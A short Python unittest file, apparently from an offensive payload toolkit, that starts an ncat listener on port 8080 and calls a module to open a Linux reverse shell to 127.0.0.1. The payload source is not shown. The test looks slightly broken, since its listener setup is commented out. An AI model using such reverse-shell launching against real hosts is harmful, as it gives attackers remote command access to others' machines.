import unittest
import subprocess
from Payloads.Reverse_Shells import multi_rshell


class MyTestCase(unittest.TestCase):

    def ncat_listener(self):
        print("Starting ncat tunnel")
        self.proc = subprocess.Popen("ncat -lvp 8080", shell=True)

    # def setUp(self):
    #     print("Starting ncat tunnel")
    #     self.proc = subprocess.Popen("ncat -lvp 8080", shell=True)
    #
    # def tearDown(self):
    #     print("Killing ncat tunnel")
    #     self.proc.communicate()
    #     self.proc.kill()

    def test_linux_shell(self):
        print("Testing reverse shell to 127.0.0.1:8080")
        self.client = multi_rshell.ReverseShell("127.0.0.1", 8080)  # Connect to client
        self.assertIsNotNone(self.client)  # Test that client exists

        multi_rshell.ReverseShell.linux(self.client)  # Initiate linux reverse shell
        self.assertIsNotNone(multi_rshell)
        # self.assertEqual(multi_rshell, True)  # Test that the shell returned true

        self.proc.communicate()
        self.proc.kill()


if __name__ == '__main__':
    unittest.main()
